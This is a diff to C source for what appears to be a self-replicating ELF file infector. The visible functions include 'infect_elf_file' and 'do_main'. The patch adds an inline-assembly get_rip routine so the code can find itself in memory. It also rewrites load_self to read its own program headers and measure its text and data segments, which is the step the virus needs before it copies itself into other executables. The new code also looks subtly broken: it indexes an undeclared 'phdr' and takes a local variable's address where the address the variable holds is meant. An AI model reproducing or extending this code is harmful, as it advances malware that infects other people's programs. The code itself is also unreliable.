@@ -4,6 +4,9 @@
 #define MAGIC_NUMBER 0x15D25 //thankz Mr. h0ffman
 
 extern long real_start;
+extern long get_rip_label;
+
+unsigned long get_rip(void);
 
 struct bootstrap_data {
 	int argc;
@@ -215,11 +218,28 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
  * parsing our own program headers etc.
  */
 int load_self(elfbin_t *elf)
-{
-	elf->mem = (void *)((long)&_start & ~4095);
+{	
+	int i;
+	Elf64_Addr _start_addr = get_rip() - ((char *)&get_rip_label - (char *)&_start);
+	elf->mem = (void *)((long)&_start_addr & ~4095);
 	elf->ehdr = (Elf64_Ehdr *)elf->mem;
 	elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
-	
+	for (i = 0; i < elf->ehdr->e_phnum; i++) {
+		if (elf->phdr[i].p_type == PT_LOAD)
+			switch(!!elf->phdr[i].p_offset) {
+				case 0:
+					elf->textVaddr = phdr[i].p_vaddr;
+					elf->textSize = phdr[i].p_memsz;
+					break;
+				case 1:
+					elf->dataVaddr = phdr[i].p_vaddr;
+					elf->dataSize = phdr[i].p_memsz;
+					break;
+			}
+			
+	}
+	elf->size = ((elf->dataVaddr + elf->dataSize) - _start_addr);
+	return 0;
 }
 
 	
@@ -316,6 +336,21 @@ void do_main(void)
 		}
 		
 	}
+}
+
+unsigned long get_rip(void)
+{
+	long ret;
+	__asm__ __volatile__ 
+	(
+	"call get_rip_label	\n"
+       	".globl get_rip_label	\n"
+       	"get_rip_label:		\n"
+        "pop %%rax		\n"
+	"mov %%rax, %0" : "=r"(ret)
+	);
+
+	return ret;
 }
 
 
